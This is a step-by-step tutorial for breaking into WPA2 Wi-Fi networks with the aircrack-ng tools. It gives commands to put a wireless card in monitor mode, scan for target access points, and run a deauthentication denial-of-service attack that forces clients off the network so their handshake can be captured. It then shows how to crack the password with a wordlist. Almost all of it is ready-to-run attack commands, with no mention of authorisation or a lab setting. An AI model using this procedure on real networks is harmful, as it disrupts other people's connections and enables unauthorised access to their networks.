# Hack WPA2 Networks

## Install Aircrak-ng In Your Machine

```
sudo apt install aircrack-ng
```



## Put the Network Interface Card in Monitor Mode

### Identify the Wireless Network Card

```
iwconfig
```

### Run The Below Commands

```
sudo airmon-ng check rfkillsudo
airmon-ng start <network interface>
```



## Look For Targets

```
sudo airodump-ng <network interface>
```



## Scan A Specific Target

```
sudo airodump-ng <network interface> --bssid <AP>
```



## Capture the Handshake

### Performing DoS on the AP

You can use `aireplay-ng` or `mdk4` to disconnect devices from APs for a time. This is called a de-authentication attack or a wireless DOS (Denial-Of-Service) attack.

Now here’s the game plan:

1. Setup airodump-ng to capture packets and save them
2. De-authenticate the device for some time while airodump-ng is running
3. Capture the handshake

### 1. Setup airodump-ng to capture packets and save them

```
sudo airodump-ng -c <channel number> --bssid <AP BSSID> <network interface> -w <path for saved packets file>
```

{% hint style="info" %}
Here, we're using the `-c` flag to specify the channel to search, the `--bssid` flag for the MAC address of the AP, and the `-w` flag to give a path you want to save the captured packets to.
{% endhint %}

{% hint style="info" %}
Quick lesson: Channels reduce the chances of APs interfering with each other. When running `airodump-ng`, you can identify the channel number under the CH column.
{% endhint %}

### 2. Run the De-Authentication Attack

```
sudo aireplay-ng -a <BSSID of the AP> --deauth <time> <network interface>
```

{% hint style="info" %}
The `-a` flag specifies the MAC address of the AP, `--deauth` specifies how long you want the attack to run in seconds, followed up by the network card.
{% endhint %}

### 3. Capture the Handshake

{% hint style="info" %}
While the DOS attack is underway, check on your airodump scan. You should see at the right top : `WPA handshake: <mac address>`. Once you have verified that, you can stop the replay attack and the `airodump-ng` scan.
{% endhint %}



## Cracking the Captured Password

{% hint style="info" %}
A PMK is basically an algorithmic combination of a word and the APs name. Our intention is to continuously generate PMKs using a wordlist against the handshake. If the PMK is valid, the word used to generate it is the **password**. If the PMK is not valid, it skips to the next word on the list.
{% endhint %}

```
sudo aircrack-ng <captured file with .cap> -w <path to wordlist>
```



## END: Put Your Network Card In Managed Mode

To clean up, simply remove the file captures, close your terminals, and run the command `service NetworkManager restart` to change your network card back to managed mode so you can connect to the Wi-Fi.
